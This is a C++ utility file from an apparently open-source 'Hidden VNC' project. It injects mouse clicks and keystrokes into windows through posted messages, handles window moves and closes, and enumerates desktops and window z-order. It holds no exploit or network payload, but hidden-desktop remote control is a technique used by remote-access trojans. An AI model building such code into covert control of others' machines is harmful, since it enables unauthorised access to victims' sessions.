/*
 * This file is part of Hidden VNC implementation from github.com/ntdll0.
 *
 * Copyright (C) 2024 Andrej.sh, github.com/ntdll0
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3 of the License
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "Utility.h"

// Global desktop list, used by EnumDesktops function
std::vector<std::wstring> HVNC::DesktopList = {};

// Initialize WindowInformation
POINT HVNC::WindowInformation::lastCoords = { 0, 0 };
POINT HVNC::WindowInformation::lastDimensions = { 0, 0 };
BOOL  HVNC::WindowInformation::isMoving = false;
HWND  HVNC::WindowInformation::windowToMove = nullptr;
HWND  HVNC::WindowInformation::workingWindow = nullptr;

POINT HVNC::ScreenToWindow(int sX, int sY, int wX, int wY, int wWidth, int wHeight) {
    int relativeX = sX - wX;
    int relativeY = sY - wY;

    if (relativeX >= 0 &&
        relativeX < wWidth && relativeY >= 0 && relativeY < wHeight)
        return { relativeX, relativeY };
    else
        return { -1, -1 };
}

BOOL HVNC::MouseClick(bool isLeft, bool isUp, int x, int y) {
    POINT coordinates{ x, y };

    if (WindowInformation::isMoving) {
        SetWindowPos(WindowInformation::windowToMove, NULL, x - WindowInformation::lastCoords.x, y - WindowInformation::lastCoords.y,
            WindowInformation::lastDimensions.x, WindowInformation::lastDimensions.y, NULL);
        WindowInformation::isMoving = false;
    }

    HWND hwnd = WindowFromPoint(coordinates);
    WindowInformation::workingWindow = hwnd;
    char windowTitle[256];
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
    if (Config::enableDebug)
        std::cout << "Clicked on " << windowTitle << "\n";
    RECT wRect;
    if (!GetWindowRect(hwnd, &wRect)) {
        return FALSE;
    }

    // w = window  s = screen
    int wX = wRect.left;
    int wY = wRect.top;
    int wWidth = wRect.right - wRect.left;
    int wHeight = wRect.bottom - wRect.top;
    POINT clickCoords = ScreenToWindow(x, y, wX, wY, wWidth, wHeight);
    LPARAM lParam = MAKELPARAM(x, y);
    LRESULT clickResult = SendMessage(hwnd, WM_NCHITTEST, 0, lParam);
    switch (clickResult)
    {
    case HTCLOSE: {
        PostMessage(hwnd, WM_CLOSE, 0, 0);
        PostMessage(hwnd, WM_DESTROY, 0, 0);
        break;
    }
    case HTCAPTION: {
        // We can handle initialize moving the window
        // by saving window width and height
        if (!isUp && isLeft) {
            WindowInformation::lastCoords = clickCoords;
            WindowInformation::lastDimensions = { wWidth, wHeight };
            WindowInformation::isMoving = true;
            WindowInformation::windowToMove = hwnd;
        }
        break;
    }
    case HTMAXBUTTON: {
        // Toggle window maximize state
        WINDOWPLACEMENT wp = { sizeof(WINDOWPLACEMENT) };
        if (GetWindowPlacement(hwnd, &wp)) {
            if (wp.showCmd == SW_SHOWMAXIMIZED) wp.showCmd = SW_RESTORE;
            else                                wp.showCmd = SW_SHOWMAXIMIZED;
            SetWindowPlacement(hwnd, &wp);
        }
        break;
    }
    default: {
        LPARAM lParam2 = MAKELPARAM(clickCoords.x, clickCoords.y);
        UINT msg;
        WPARAM param;
        if (isLeft) {
            param = MK_LBUTTON;
            if (isUp) msg = WM_LBUTTONUP;
            else      msg = WM_LBUTTONDOWN;
        }
        else {
            param = MK_RBUTTON;
            if (isUp) msg = WM_RBUTTONUP;
            else      msg = WM_RBUTTONDOWN;
        }
        PostMessage(hwnd, msg, param, lParam2);
        break;
    }
    }

    // Cleanup
    //if (hWindow != NULL)
    //    CloseHandle(hWindow);
    return TRUE;
}

BOOL HVNC::Key(bool isUp, int key) {
    if (WindowInformation::workingWindow == INVALID_HANDLE_VALUE || WindowInformation::workingWindow == NULL)
        return FALSE;

    LPARAM keyMapping = (LPARAM)(MapVirtualKey(key, MAPVK_VK_TO_VSC) << 16 | 0xC0000000);
    UINT msg;
    if (isUp) msg = WM_KEYUP;
    else      msg = WM_KEYDOWN;
    PostMessage(WindowInformation::workingWindow, msg, key, isUp ? keyMapping : 0);
    return TRUE;
}

BOOL CALLBACK HVNC::EnumDesktopsProc(LPTSTR lpszDesktop, LPARAM lParam) {
    wchar_t desktopName[MAX_PATH];
    HDESK hDesktop = OpenDesktop(lpszDesktop, 0, FALSE, DESKTOP_READOBJECTS);

    if (hDesktop == NULL) return TRUE;
    DWORD lenght = 0;
    if (GetUserObjectInformation(hDesktop, UOI_NAME, desktopName, MAX_PATH, &lenght))
        DesktopList.push_back(desktopName);

    CloseDesktop(hDesktop);
    return TRUE;
}

std::vector<std::wstring> HVNC::EnumerateDesktops() {
    DesktopList.clear();
    DesktopList.shrink_to_fit();
    EnumDesktops(GetProcessWindowStation(), EnumDesktopsProc, 0);
    return DesktopList;
}

BOOL HVNC::Win8Higher() {
    OSVERSIONINFOEX osVersion;
    DWORDLONG conditionMask = 0;
    int op = VER_GREATER_EQUAL;

    ZeroMemory(&osVersion, sizeof(OSVERSIONINFOEX));

    osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    osVersion.dwMajorVersion = 6;

    VER_SET_CONDITION(conditionMask, VER_MAJORVERSION, op);
    VER_SET_CONDITION(conditionMask, VER_MINORVERSION, op);

    return VerifyVersionInfo(&osVersion, VER_MAJORVERSION | VER_MINORVERSION, conditionMask);
}

int HVNC::GetWindowZIndex(HWND hwnd) {
    HWND hwndPrev = GetWindow(hwnd, GW_HWNDPREV);
    int z = 0;
    while (hwndPrev != NULL) {
        z++;
        hwndPrev = GetWindow(hwndPrev, GW_HWNDPREV); 
    }
    return z;
}

BOOL CALLBACK HVNC::EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    std::vector<std::pair<HWND, int>>& windowList = *reinterpret_cast<std::vector<std::pair<HWND, int>>*>(lParam);
    windowList.push_back(std::make_pair(hwnd, GetWindowZIndex(hwnd)));
    return TRUE;
}